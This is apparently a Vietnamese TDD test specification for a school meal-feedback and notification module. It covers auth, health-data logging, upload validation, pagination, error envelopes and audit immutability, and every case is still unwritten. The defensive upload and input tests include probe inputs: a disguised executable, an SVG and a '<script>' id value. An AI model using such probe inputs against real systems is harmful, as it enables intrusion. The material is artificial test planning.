**Feature Under Test:** Spring Security filter chain + logging config
**Test File:** `.../security/Mf10AuthAndLoggingIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-041`
**Oracle Source:** **MSG-004** *"Session expired. Please log in again."* · **BR-004** · TDS **§4.3** — *"Nội dung `comment` có thể chứa **dữ liệu sức khỏe** (BR-142) → **cấm** log nguyên văn; log chỉ `feedbackId` + `illnessKeyword=true/false`"*

**Test Steps:**
1. Gọi 17 endpoint §9.1 **không** `Authorization` header → tất cả **401 `FBA-004`**
2. Gọi với token hết hạn → **401 `FBA-004`**
3. `POST /feedbacks {comment:"Con về kêu đau bụng nhẹ buổi chiều."}` → bắt log (`OutputCaptureExtension`), assert log **không** chứa chuỗi `"đau bụng"` và **không** chứa `studentId`
4. Assert log **có** dòng dạng `feedbackId=FB-… illnessKeyword=true` (đủ để vận hành, không đủ để lộ PII)
5. Kích hoạt lỗi 500 giả lập → stack trace **không** in `comment`

**Expected Result (PASS):** 401 đúng mã ở mọi endpoint; không byte nội dung phản hồi nào ra log.
**Expected Result (FAIL):** Log nội dung → nhật ký ứng dụng (thường được thu thập tập trung, giữ lâu hơn dữ liệu nghiệp vụ và ít kiểm soát truy cập hơn) trở thành bản sao dữ liệu sức khỏe trẻ em. Đây là mục **DPO Sign-off**.

**Current Status:** 🔴 Not written

---

### MF10-TC-SEC-009 — Ảnh đính kèm phản hồi đi qua `StorageService`, kiểm nội dung thật (D10 / L8)

**Severity:** `HIGH`
**OWASP:** `A04:2021 — Insecure Design` · `A08:2021 — Software and Data Integrity Failures`
**CWE:** `CWE-434 — Unrestricted Upload of File with Dangerous Type`
**Feature Under Test:** `FeedbackAttachmentService`
**Test File:** `.../security/FeedbackUploadSecurityIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-042`
**Oracle Source:** **D10 (Approved 31/07)** — nêu đích danh *"**MF10** ảnh đính kèm phản ánh"*: *"phải inject `StorageService` có sẵn ở `common/storage`, **không** tự gọi `MultipartFile.transferTo()`/AWS SDK riêng"* · **MSG-008** *"File upload failed: File size exceeds the maximum limit of 10MB."* · `FX-016`

**Test Steps (Error Guessing):**
1. Upload `phan-anh-suat-an.jpg` (280 KB, magic `\xFF\xD8\xFF`) → ✅ 201; `verify(storageService).store(startsWith("feedbacks/"), any())`
2. Upload `oversize.jpg` (12 MB) → ❌ **MSG-008**
3. Upload `fake.jpg` (đuôi `.jpg`, magic `MZ` = executable) → ❌ chặn theo **magic bytes**, không theo đuôi file
4. Upload `.svg` (vector có thể nhúng script) → ❌ ngoài whitelist
5. ArchUnit: **không** class nào trong package MF10 gọi `MultipartFile.transferTo` hoặc `software.amazon.awssdk`
6. Response **không** trả `storage_key`/đường dẫn nội bộ

**Expected Result (PASS = an toàn):** Chỉ ảnh thật trong whitelist qua được; mọi I/O đi qua abstraction chung.
**Expected Result (FAIL = lỗ hổng):** Đổi đuôi file là đẩy được executable lên storage dùng chung với 4 module khác (MF03/MF07/MF08/MF11 cùng dùng `StorageService`).

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ **TDS-MF10 hiện chưa có** bảng `feedback_attachments` lẫn endpoint upload (L8) — test này 🔴 cho tới khi Mạnh bổ sung TDS §5.2/§9 (**F2** §8.1). Mock có ô chọn file (`Paperclip`) nhưng file **không đi đâu cả**, nên đây là chức năng nửa vời ở cả hai phía.

---

### MF10-TC-SEC-010 — Contract test trên `/v3/api-docs` *(D8 — chỉ chạy khi Nam approve)*

**Severity:** `MEDIUM`
**Feature Under Test:** OpenAPI spec sinh từ springdoc
**Test File:** `.../contract/OpenApiContractIT.java`
**TDD Phase:** ⏸️ `@Disabled("D8 chưa được Nam approve — 00_Common_Conventions.md")`
**Condition Ref:** `TC-COND-043`
**Oracle Source:** **D8 §"Việc phải làm ở từng TDS"** — *"§13 / TestSpec — ≥1 **contract test đọc `/v3/api-docs`** và assert: (a) không field `id` nào có `format: uuid`; (b) mọi response 4xx/5xx trỏ `ErrorResponse`; (c) mọi enum khớp bảng D6"*

**Test Steps:**
1. `GET /v3/api-docs` → parse JSON
2. Assert (a): không schema nào của MF10 có field tên `id`/`*Id` với `format: "uuid"` — **D1/S6**
3. Assert (b): mọi `@ApiResponse` 4xx/5xx của 17 endpoint trỏ `ErrorResponse` — **D2/S3**
4. Assert (c): enum `NotificationType` có **đúng 7** giá trị D6; `MealType` có 3; `RoleKey` kebab-case — **D6/S5**
5. Assert (d): mọi `description` của `@Operation` chứa **UC ID + BR ID** — **S2**
6. Assert (e): mọi `GET` danh sách khai `PagedResponse` — **S7**

**Expected Result (PASS):** Spec sinh cho FE (`openapi-typescript`, T3.4) không mang lại lệch D1/D2/D6 qua đường tự động.
**Expected Result (FAIL):** Type FE sinh ra sai theo spec — lệch quay lại bằng đường khó thấy hơn vì nằm trong file sinh tự động (đúng lý do D8 tồn tại).

**Current Status:** ⏸️ Blocked — bỏ `@Disabled` ngay khi D8 chuyển ✅ Approved.

---

### INTEGRATION TEST CASES

> Dùng **Testcontainers PostgreSQL 16** + Flyway thật (không `create-drop`). Timeout 120s. Mailpit cho nhánh email (BR-159).

---

### MF10-TC-INT-001 — Gửi phản hồi end-to-end (UC-085 happy path)

**Severity:** `HIGH`
**Feature Under Test:** Full flow: `POST /api/v1/feedbacks` → DB → `notifications` → audit
**Test File:** `src/test/java/com/sfms/mf10/integration/FeedbackSubmitIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-024`, `TC-COND-006`, `TC-COND-007`
**Oracle Source:** **UC-085** Normal Flow bước 5 (*"System saves feedback (MSG-046), notifies Service Caterers, and if illness keywords detected, triggers MSG-058 and alerts Medical Staff"*) · **MSG-046** · **BR-139/140/142**

**Preconditions:** container chạy; Flyway `V1`–`V17` + **`V18__mf10_feedback_announcement.sql`** + **`V19__seed_mf10.sql`** (🔴 `M10-D05`); `ReferenceResolver` = `FX-002` (🔴 `M10-D06`); clock `FX-001`; actor `FX-017`.

**Test Steps:**
1. `POST /api/v1/feedbacks` với payload `FX` hợp lệ, `rating=2`, `tags=["Món ăn nguội"]`, `comment="Con về kêu đau bụng nhẹ"`, **`illnessKeyword:false`** (client nói dối — L9)
2. Assert **201**; body có `id` dạng `FB-…`, `editableUntil` = `servedAt + 24h` (ISO)
3. Assert DB `feedbacks`: 1 dòng mới, `illness_keyword = **true**`, `submitted_at` = clock server, `meal_session_id` không null
4. Assert DB `notifications`: **3** dòng mới — `FeedbackSubmitted` (caterer), **MSG-057** (`rating<3`), **MSG-058** (`ALLERGY_ALERT`, roles chứa `medical-staff`)
5. Assert audit log có bản ghi `CREATE Feedback FB-…`

**Expected Result (PASS):**
```java
var row = jdbc.queryForMap("select * from feedbacks where code = ?", code);
assertThat(row.get("illness_keyword")).isEqualTo(true);      // L9 — server tính lại
assertThat(row.get("meal_session_id")).isNotNull();          // L10
assertThat(countNotifications(code)).isEqualTo(3);           // TC-007 decision table
```
**Expected Result (FAIL):** Chỉ 1 notification → hoặc MSG-057 chưa implement (CF-M10-9), hoặc hai nhánh bị gộp `if/else`.

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-002 — Cửa sổ 24 giờ chặn ở tầng API, không chỉ ở FE (MSG-022)

**Severity:** `CRITICAL`
**Feature Under Test:** `POST /api/v1/feedbacks` với phiên ăn quá hạn
**Test File:** `.../integration/FeedbackSubmitIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-001`
**Oracle Source:** **BR-139** · **MSG-022** (nguyên văn) · **UC-085 AF2** · `review.md` **H4** (*"hiện gate cũng chỉ ở client (`m.feedbackOpen`)"*)

**Test Steps:**
1. `POST /feedbacks {mealSessionId:"MS-20260630-L"}` (phục vụ ~34h trước) → **409**
2. Assert body: `error.code == "FBA-022"`, `error.message` **nguyên văn** `"Feedback submission blocked: Outside the 24-hour limit of meal serving."`, `error.details` là **mảng** (có thể rỗng, không `null`)
3. Assert DB **không** có dòng mới
4. `POST` với `mealSessionId:"MS-9999"` → **404 `FBA-404`** (phân biệt với 409)

**Expected Result (PASS):** 409 đúng mã + message tiếng Anh (D7); không ghi DB.
**Expected Result (FAIL):** 201 → toàn bộ BR-139 chỉ tồn tại trên giao diện; bất kỳ ai gọi API trực tiếp (hoặc app Flutter tương lai) đều bỏ qua được.

**Current Status:** 🔴 Not written
**Implementation Note:** Test gọi API **trực tiếp**, không qua FE — đây chính là cách chứng minh gate nằm ở server.

---

### MF10-TC-INT-003 — BR-140 được chặn ở cả tầng DB, không chỉ service

**Severity:** `HIGH`
**Feature Under Test:** `ck_fb_low_rating_needs_tag`
**Test File:** `.../integration/FeedbackConstraintIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-003`
**Oracle Source:** **BR-140** · TDS §5.2 (*"Bất biến DB (không chỉ ở service)"*) · **C4**

**Test Steps:**
1. `INSERT` thẳng qua JDBC: `submitter_role='PARENT', rating=2, tags='[]'` → assert ném `DataIntegrityViolationException`, message chứa `ck_fb_low_rating_needs_tag`
2. `INSERT`: `submitter_role='TEACHER', rating=2, tags='[]'` → ✅ thành công (CF-M10-3 — constraint phải có nhánh `submitter_role <> 'PARENT'`)
3. `INSERT`: `rating=0` → vi phạm `CHECK (rating BETWEEN 1 AND 5)`
4. `UPDATE feedbacks SET tags='[]' WHERE rating=2 AND submitter_role='PARENT'` → cũng bị chặn *(constraint áp cả khi UPDATE, không chỉ INSERT)*

**Expected Result (PASS):** 3 thao tác bị chặn, 1 qua; bước 4 chứng minh constraint không bị lách bằng đường update sau.
**Expected Result (FAIL):** Chỉ validate ở service → seed sai hoặc script sửa dữ liệu tay tạo ra bản ghi vi phạm BR-140, và dashboard BR-141 thống kê trên dữ liệu không hợp lệ.

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-004 — Một người chỉ phản hồi một lần cho cùng bữa và món (kể cả khi gửi song song)

**Severity:** `HIGH`
**Feature Under Test:** `uq_fb_once` · `POST /feedbacks`
**Test File:** `.../integration/FeedbackDuplicateIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-025`
**Oracle Source:** TDS §5.2 `uq_fb_once (submitter_user_id, meal_session_id, dish_id, student_id)` — *"Một người chỉ phản hồi MỘT lần cho một (phiên ăn × món); sửa dùng PATCH (UC-046 AF1)"* · mã `FBA-DUP`

**Test Steps (Concurrency Testing):**
1. `POST` lần 1 → 201
2. `POST` lần 2 cùng bộ khóa → **409 `FBA-DUP`**
3. `POST` cùng phiên nhưng **món khác** → ✅ 201
4. `POST` cùng phiên, cùng món, **học sinh khác** (phụ huynh có 2 con) → ✅ 201
5. **Race:** 2 thread gửi đồng thời cùng bộ khóa → đúng **1** thành công, **1** nhận 409; DB có **1** dòng

**Expected Result (PASS):** Bước 5 không bao giờ tạo 2 dòng — chứng minh bất biến nằm ở **unique index**, không phải check-then-act.
**Expected Result (FAIL):** 2 dòng → điểm trung bình BR-141 bị một người đẩy lệch bằng cách bấm gửi hai lần; và UC-046 "sửa phản hồi" mất nghĩa vì có nhiều bản để sửa.

**Current Status:** 🔴 Not written
**Implementation Note:** `student_id` là `NULL` với `scope=CLASS` (Teacher) — PostgreSQL coi các `NULL` là **khác nhau** trong unique index, nên với Teacher cần index riêng hoặc `COALESCE`. Ghi rõ khi implement, đừng để lọt bản ghi trùng của giáo viên.

---

### MF10-TC-INT-005 — Rút phản hồi là soft delete: biến khỏi API nhưng còn trong DB

**Severity:** `HIGH`
**Feature Under Test:** `DELETE /api/v1/feedbacks/{code}` · mọi query đọc
**Test File:** `.../integration/FeedbackRetractIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-026`, `TC-COND-002`
**Oracle Source:** **UC-046 AF2** (*"Parent confirms, and system deletes the feedback record"*) · TDS **§4.2** — *"Xóa phản hồi là **soft delete** (`deleted_at`): dữ liệu đã vào thống kê tuần (BR-141) và có thể là đầu mối sự cố (BR-142) — xóa cứng làm mất dấu vết điều tra"* · **BR-141**, **BR-142**

**Test Steps:**
1. `DELETE /api/v1/feedbacks/FB-8812` (trong cửa sổ) → **204**
2. Assert DB: dòng **vẫn còn**, `deleted_at` không null
3. `GET /feedbacks` (chủ sở hữu) → **không** có `FB-8812`
4. `GET /feedbacks/FB-8812` → **404**
5. `GET /feedbacks/dashboard` → `totalFeedbacks` **giảm 1** so với trước khi xóa
6. `DELETE` lần 2 → **404** (không xóa hai lần)
7. `DELETE /api/v1/feedbacks/FB-8809` (ngoài cửa sổ) → **409 `FBA-022`**

**Expected Result (PASS):** Dữ liệu còn cho audit/điều tra nhưng biến mất khỏi mọi đường đọc nghiệp vụ và khỏi thống kê.
**Expected Result (FAIL):** Xóa cứng → nếu phản hồi đó là đầu mối của một sự cố đang điều tra (BR-142 → MF11), bằng chứng biến mất theo một cú bấm của phụ huynh. Hoặc: soft delete nhưng quên lọc ở dashboard → số liệu tuần không khớp danh sách.

**Current Status:** 🔴 Not written
**Implementation Note:** Lọc `deleted_at IS NULL` phải nằm ở **Specification dùng chung**, không rải ở từng query — bước 5 là chỗ dễ quên nhất.

---

### MF10-TC-INT-006 — Trả lời phản hồi end-to-end và thông báo ngược cho người gửi (UC-163 / BR-143)

**Severity:** `HIGH`
**Feature Under Test:** `POST /api/v1/feedbacks/{code}/response` → `feedback_responses` → notification
**Test File:** `.../integration/FeedbackResponseIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-022`
**Oracle Source:** **BR-143** · **UC-163** Postconditions — *"The response is saved and **the original submitter (parent/teacher) can view the response**"* · **UC-046** Normal Flow bước 4 (*"including any response/reply submitted by the Service Caterers (BR-143)"*)

**Test Steps:**
1. `service-caterers` `POST /feedbacks/FB-8809/response {content:"Đã điều chỉnh thời gian giữ nóng…"}` → **201**, `lateResponse` đúng theo mốc
2. Assert DB `feedback_responses`: 1 dòng, `responder_user_id` = actor JWT (không từ body)
3. Assert `notifications`: 1 dòng gửi tới **chủ sở hữu phản hồi** *(vai `parent`)*
4. `parent` (chủ sở hữu) `GET /feedbacks/FB-8809` → có `responses[]` 1 mục, đủ `content`/`respondedAt`/`responder`
5. `service-caterers` `GET /feedbacks?not:responded=true` → **không** còn `FB-8809` *(kiểm bộ lọc phủ định `not:` của §2b-2)*
6. `POST` lần 2 → **201**, `responses[]` có **2** mục (append, nhiều lượt trả lời — TDS §6.6)

**Expected Result (PASS):** Luồng khép kín hai chiều: caterer viết, phụ huynh đọc được, và bộ lọc "chưa trả lời" phản ánh đúng.
**Expected Result (FAIL):** Không notify ngược → phụ huynh không biết mình đã được trả lời, phải tự vào xem; UC-046 mô tả đúng kỳ vọng ngược lại.

**Current Status:** 🔴 Not written
**Implementation Note:** `responded` là **dẫn xuất** (`EXISTS(feedback_responses)`), không phải cột — xem `MF10-TC-INT-015`.

---

### MF10-TC-INT-007 — Dashboard tổng hợp ẩn danh tới mức lớp; job tuần phát digest (UC-164 / BR-141 / BR-145)

**Severity:** `CRITICAL`
**Feature Under Test:** `GET /api/v1/feedbacks/dashboard` · `WeeklyFeedbackDigestJob`
**Test File:** `.../integration/FeedbackDashboardIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-027`, `TC-COND-008`
**Oracle Source:** **BR-145** (*"tổng hợp **ẩn danh**"*) · **BR-141** (*"tự động biên soạn biểu đồ phản hồi tổng hợp **hàng tuần** và gửi báo cáo đến **quản lý catering và ban giám hiệu**"*) · **UC-164** Normal Flow bước 2–3

**Test Steps (Negative/Absence Testing — có tiền đề khẳng định):**
1. **Tiền đề:** assert DB có ≥3 phản hồi kèm `student_id` không null ⭐
2. `school-admin` `GET /feedbacks/dashboard?weekStart=2026-06-29` → **200**
3. Assert **có**: `totalFeedbacks`, `averageRating`, `ratingDistribution`, `negativeCount`, `illnessFlaggedCount`, `topTags`, `byClass`
4. Assert **không có**: serialize toàn bộ response thành chuỗi → `assertThat(json).doesNotContain("studentId", "student", "HS-3A-", "Nguyễn Minh Khang")`
5. Assert `byClass` là mức chi tiết nhỏ nhất — **không** có mảng phần tử nào chứa danh tính cá nhân
6. Chạy `compileAndSendWeeklyDigest(schoolId)` → assert sinh notification tới **cả** `school-admin` **và** `service-caterers` (BR-141 nêu cả hai)
7. Phản hồi đã soft-delete **không** vào tổng hợp (nối tiếp `INT-005` bước 5)

**Expected Result (PASS):** Số liệu đúng và không lộ định danh; digest tới đúng 2 nhóm người nhận.
**Expected Result (FAIL):** Bước 4 lọt tên học sinh → vi phạm BR-145 ngay tại màn mà BGH mở hằng ngày. Bước 6 chỉ gửi BGH → BR-141 nói rõ **"quản lý catering và ban giám hiệu"**, thiếu một bên là thiếu nửa mục đích của báo cáo.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Bước 4 dùng `doesNotContain` trên **chuỗi JSON thô** — mạnh hơn kiểm `has(field)` vì bắt được cả trường hợp danh tính lọt vào chuỗi mô tả (`"Phản hồi của Nguyễn Minh Khang"`).

---

### MF10-TC-INT-008 — Hợp đồng phân trang §2b trên 3 resource của MF10

**Severity:** `HIGH`
**Feature Under Test:** `PagedResponse<T>` · `FeedbackSpec` · `AnnouncementSpec` · `NotificationRepository`
**Test File:** `.../integration/PagedContractIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-028`
**Oracle Source:** **Team Plan §2b-1** (5 field bất biến), **§2b-2** (query params), **§2b-3** (thứ tự lọc), **§2b-6** (edge cases), **§2b-7** (checklist review của Mạnh)

**Test Steps:** seed 20 feedback, 12 announcement, 30 notification; với **mỗi** resource:
1. `?page=1&pageSize=8` → JSON có **đúng 5 key** `items,total,page,pageSize,pageCount`, không wrapper
2. `?page=99&pageSize=8` → `page` **clamp** về `pageCount`, trả trang cuối (không rỗng)
3. `?search=zzz` (không khớp) → **200** `{items:[],total:0,page:1,pageSize:8,pageCount:1}` — **không 404**
4. `?pageSize=0` và `?pageSize=-5` → clamp về 1
5. `?search=NGUOI` trên feedback → khớp `comment` chứa `"nguội"` (không dấu, không phân biệt hoa/thường); **không** khớp nếu chuỗi chỉ nằm ở field ngoài `SEARCH_FIELDS`
6. Lọc exact: `?illnessKeyword=true`, `?rating=2`, `?status=PUBLISHED`, `?urgent=true`, `?mealType=LUNCH`
7. Lọc phủ định: `?not:responded=true`
8. `?dateFrom=2026-06-29&dateTo=2026-07-01` → feedback lọc trên `meal_date`, announcement trên `published_at`, notification trên `sent_at`
9. `?search=` (rỗng) và `?rating=` (rỗng) → **bỏ qua**, không lọc

**Expected Result (PASS):** Cả 9 nhóm assert đúng trên 3 resource; đây cũng là checklist §2b-7 mà Mạnh phải tick khi review module khác.
**Expected Result (FAIL):** Trả 404 khi rỗng → mọi màn danh sách hiện "lỗi" thay vì "không có dữ liệu"; `search` OR trên mọi cột → full table scan trên bảng phản hồi lớn nhất hệ thống (§2b-5 cảnh báo đích danh).

**Current Status:** 🔴 Not written
**Implementation Note:** Test này **dùng lại được cho 12 module** — cân nhắc đặt lớp cha `AbstractPagedContractIT` ở test-fixtures chung.

---

### MF10-TC-INT-009 — `id` công khai là mã nghiệp vụ, không UUID lọt ra API (D1 / L1)

**Severity:** `HIGH`
**Feature Under Test:** Toàn bộ 17 endpoint §9.1
**Test File:** `.../integration/PublicIdContractIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-021`, `TC-COND-020`
**Oracle Source:** **D1** · `review.md` **A1** = **blocker** · **D4** (kèm luôn kiểm ngày)

**Test Steps:**
1. Gọi lần lượt 17 endpoint, gom toàn bộ response JSON
2. Assert **không** chuỗi nào khớp regex UUID `[0-9a-f]{8}-[0-9a-f]{4}-...` ở bất kỳ field nào
3. Assert `id` khớp khuôn nghiệp vụ: `^FB-`, `^ANN-`, `^NTF-`, `^FBR-`
4. Assert FK trong JSON dùng `code` bảng đích: `dishId ~ ^DISH-`, `studentId ~ ^HS-`, `feedbackId ~ ^FB-`
5. Assert **không** chuỗi nào khớp `\d{2}/\d{2}/\d{4}` (D4 — kiểm cùng lượt)
6. Path param: `GET /api/v1/announcements/ANN-112` → 200; `GET /api/v1/announcements/<uuid của ANN-112>` → **404**

**Expected Result (PASS):** API nói cùng một ngôn ngữ định danh với FE ở mọi endpoint; bước 6 chứng minh UUID **không** phải đường vào thứ hai.
**Expected Result (FAIL):** Lộ UUID ở một endpoint → FE lưu vào state rồi dùng cho endpoint khác vốn nhận `code` → 404 rải rác, khó lần vì chỉ xảy ra ở một số luồng.

**Current Status:** 🔴 Not written
**Implementation Note:** Chấp nhận **2 đường vào** (`code` và UUID) là cách hỏng dần: rồi sẽ có chỗ so sánh `id` giữa hai nguồn và không khớp. Bước 6 khóa chặn từ đầu.

---

### MF10-TC-INT-010 — Envelope lỗi đủ 3 field và thông điệp tiếng Anh (D2 / D7 / L5 / L6)

**Severity:** `HIGH`
**Feature Under Test:** `@RestControllerAdvice` của `common/`
**Test File:** `.../integration/ErrorEnvelopeIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-029`
**Oracle Source:** **D2** (*"`details` — mảng, có thể rỗng; **không bao giờ `null`**"*) · **D7** (*"backend trả `code` + `message` **tiếng Anh**, nguyên văn `error_message.md`"*) · TDS §10

**Test Steps:** kích hoạt lần lượt **8 mã lỗi** của MF10 và assert cho từng cái:

| Mã | Cách kích hoạt | HTTP |
|---|---|---|
| `FBA-004` | không JWT | 401 |
| `FBA-005` | vai sai (`teacher` gọi `POST /announcements`) | 403 |
| `FBA-022` | gửi phản hồi ngoài 24h | 409 |
| `FBA-140` | `rating=2, tags=[]` (Parent) | 422 |
| `FBA-REQ` | thiếu `mealSessionId` | 422 |
| `FBA-DUP` | gửi trùng | 409 |
| `FBA-STATE` | `PUBLISHED → DRAFT` | 409 |
| `FBA-404` | `code` không tồn tại | 404 |

1. Assert mọi response có **đúng** `error.code`, `error.message`, `error.details`
2. Assert `error.details` là **array** (kể cả rỗng), **không** `null`, **không** object
3. Assert `error.message` **không** chứa ký tự tiếng Việt có dấu — regex `[àáâãèéêìíòóôõùúýăđĩũơưạ-ỹ]` không khớp (D7)
4. Với 3 mã có MSG chính thức (`FBA-004/005/022`): assert `message` **khớp nguyên văn** `error_message.md` (MSG-004/005/022)
5. Với 5 mã cục bộ: assert **chỉ** `code` (nội dung chờ MSG-104+ theo T1.1 — L5)

**Expected Result (PASS):** 8/8 mã đúng envelope; 3 mã chính thức khớp nguyên văn.
**Expected Result (FAIL):** `details: null` → FE `data.error.details.map()` ném; message tiếng Việt lẫn tiếng Anh → `lib/messages.ts` (T3.2) không map được và người dùng thấy hai ngôn ngữ trong cùng một màn.

**Current Status:** 🔴 Not written
**Implementation Note:** TDS-MF10 §10 hiện đã viết message tiếng Anh cho cả 5 mã cục bộ — thuận lợi hơn MF08 (F5 của MF08 phải dịch lại). Chỉ cần Huy cấp mã MSG chính thức là đổi bảng ánh xạ, **không** sửa test.

---

### MF10-TC-INT-011 — Client gửi `id`: dùng làm `code`, trùng thì 409 (D5 / L15)

**Severity:** `MEDIUM`
**Feature Under Test:** `POST /api/v1/feedbacks` · `code_sequences`
**Test File:** `.../integration/ClientSuppliedIdIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-030`
**Oracle Source:** **D5** — *"body có `id` → dùng làm `code`, kiểm trùng → trùng thì **409**; vắng → server tự sinh theo `code_sequences`; backend **luôn** trả `id` trong response 201"*; D5 nêu đích danh **`FB-${Date.now()}`**

**Test Steps:**
1. `POST {id:"FB-990001", …}` → **201**, `response.id == "FB-990001"`, DB `code = 'FB-990001'`
2. `POST {id:"FB-990001", …}` lần 2 (khác phiên ăn, tránh đụng `uq_fb_once`) → **409** *(mã `FBA-409` hoặc `FBA-DUP` — chốt **một**, ghi vào §10 TDS)*
3. `POST` **không** có `id` → **201**, `response.id` khớp khuôn `^FB-\d+`, sinh từ `code_sequences`
4. `POST {id:"<script>"}` / `{id:"FB-" + "x".repeat(200)}` → **422** (khuôn mã hợp lệ + độ dài ≤32)
5. Race: 2 thread `POST` **không** có `id` đồng thời → 2 mã **khác nhau**, không trùng

**Expected Result (PASS):** Cả 3 nhánh D5 hoạt động; bước 5 chứng minh `code_sequences` dùng `INSERT … RETURNING` chứ không đọc-rồi-ghi (D1).
**Expected Result (FAIL):** Server tự cấp mã khác với mã client gửi → mock `router.push` ngay tới `id` client vừa sinh (`feedback/meal/page.tsx:86`) sẽ điều hướng tới bản ghi **không tồn tại**. D5 sinh ra để chặn đúng lỗi này.

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-012 — Lịch sử sửa đổi là bất biến: không sửa, không xóa được (BR-144)

**Severity:** `CRITICAL`
**Feature Under Test:** `announcement_revisions` + RULE `r_annrev_no_update` / `r_annrev_no_delete`
**Test File:** `.../integration/AnnouncementRevisionIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-031`, `TC-COND-010`, `TC-COND-011`
**Oracle Source:** **BR-144** · **ADR-M10-3** (*"bảng append-only … cùng nguyên tắc audit bất biến BR-162"*) · **BR-162** (*"nhật ký audit phải **bất biến** — không ai có thể chỉnh sửa hoặc xóa"*) · TDS §5.2

**Test Steps:**
1. `POST /announcements {status:"PUBLISHED"}` → DB `announcement_revisions` có **1** dòng, `note='Công bố lần đầu'`
2. `PATCH` 2 lần → **3** dòng; `revised_at` tăng dần
3. `UPDATE announcement_revisions SET note='đã sửa'` → assert **0 dòng bị đổi** (RULE `DO INSTEAD NOTHING`), đọc lại thấy `note` cũ
4. `DELETE FROM announcement_revisions` → assert **0 dòng bị xóa**, `count` không đổi
5. `GET /announcements/{code}` (school-admin) → `revisions[]` **3** mục, thứ tự tăng theo `revised_at`
6. `PATCH {status:"DRAFT"}` trên bản `PUBLISHED` → **409 `FBA-STATE`**, và **không** sinh revision nào *(thao tác bị từ chối thì không ghi vết)*

**Expected Result (PASS):** Bước 3/4 là điểm mấu chốt — DB **tự** từ chối, không phụ thuộc kỷ luật code.
**Expected Result (FAIL):** Nếu chỉ dựa vào "service không gọi update" → một script sửa dữ liệu tay hoặc một PR sau này thêm `revisionRepository.save(existing)` là xóa được vết BR-144 mà không ai biết. Bước 6 sai (sinh revision cho thao tác bị từ chối) làm lịch sử ghi việc chưa từng xảy ra.

**Current Status:** 🔴 Not written
**Implementation Note:** RULE của PostgreSQL nuốt lệnh **im lặng** (không ném lỗi) — test phải assert bằng **đọc lại dữ liệu**, không assert exception.

---

### MF10-TC-INT-013 — Trạng thái đã đọc tính theo từng người, không phải cờ toàn cục (CF-M10-10)

**Severity:** `HIGH`
**Feature Under Test:** `notification_reads` · `GET /notifications` · `PATCH /notifications/{code}/read`
**Test File:** `.../integration/NotificationReadIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-032`, `TC-COND-019`
**Oracle Source:** TDS **CF-M10-10** + **§5.2** — *"một thông báo gửi **nhiều vai/nhiều người** … một người đọc là mọi người 'đã đọc'"* → tách `notification_reads`; *"API trả `read` **tính theo người đang đăng nhập** nên **shape JSON của FE không đổi**"* · `notification-bell.tsx` (đếm `unread`)

**Test Steps:**
1. `NTF-900` gửi `["medical-staff","school-admin"]`, chưa ai đọc
2. `U-MEDICAL-001` `GET /notifications` → `NTF-900` có `read=false`
3. `U-MEDICAL-001` `PATCH /notifications/NTF-900/read` → 204
4. `U-MEDICAL-001` `GET` → `read=**true**`
5. `U-ADMIN-001` `GET` → `NTF-900` vẫn `read=**false**` ⭐
6. Assert DB `notification_reads` có **1** dòng; bảng `notifications` **không** có cột `read`
7. `PATCH read` lần 2 bởi cùng người → **204 idempotent**, vẫn 1 dòng (`uq_ntfread`)
8. `U-CATERER-001` (không thuộc `recipientRoles`) `GET` → **không** thấy `NTF-900`; `PATCH read` → **403/404**
9. `NTF-895` (`audience=ALL`) → **mọi** vai đều thấy

**Expected Result (PASS):** Bước 5 là điểm mấu chốt; bước 6 chứng minh mô hình đã đổi chứ không chỉ đổi cách đọc.
**Expected Result (FAIL):** Giữ cờ toàn cục → Y tế mở cảnh báo dị ứng lúc 6h sáng thì badge của BGH cũng về 0; BGH không bao giờ biết có cảnh báo. Lỗi im lặng, không ai báo cáo được vì "hệ thống vẫn chạy".

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-014 — Cấu hình thông báo lưu bền; loại CRITICAL không tắt được (UC-088 / BR-158b / BR-138)

**Severity:** `HIGH`
**Feature Under Test:** `GET`/`PUT /api/v1/notification-preferences/me` · `NotificationDispatcher`
**Test File:** `.../integration/NotificationPreferenceIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-033`, `TC-COND-015`
**Oracle Source:** **BR-158b** · **BR-138** · mock `notification-settings/page.tsx` (3 loại gắn nhãn **"CRITICAL — luôn gửi"**, checkbox bị vô hiệu) · **D6** (7 loại)

**Test Steps:**
1. `GET /notification-preferences/me` khi **chưa** có bản ghi → **200** với mặc định BR-158 (`22:00`/`06:00`, mọi loại `true`, `emailFallback=true`) — **không** 404
2. `PUT {typeEnabled:{EXPIRY_ALERT:false}, quietStart:"21:00", quietEnd:"07:00"}` → 200
3. `GET` lại → đúng giá trị vừa lưu *(khác mock: mock chỉ giữ trong `useState`, tải lại trang là mất — CF-M10-7)*
4. Restart context (`@DirtiesContext`) → `GET` vẫn đúng — **lưu bền thật**
5. `PUT {typeEnabled:{FOOD_RECALL:false}}` → **200 chấp nhận lưu**, nhưng response kèm `criticalTypes:["INCIDENT_ALERT","FOOD_RECALL","ALLERGY_ALERT"]`
6. Phát `FOOD_RECALL` cho user đó lúc 23:30 → **vẫn gửi** (BR-138 thắng cấu hình cá nhân)
7. Phát `EXPIRY_ALERT` (đã tắt ở bước 2) → **không** gửi push, nhưng **có** dòng trong `notifications` để xem ở chuông (UC-136)
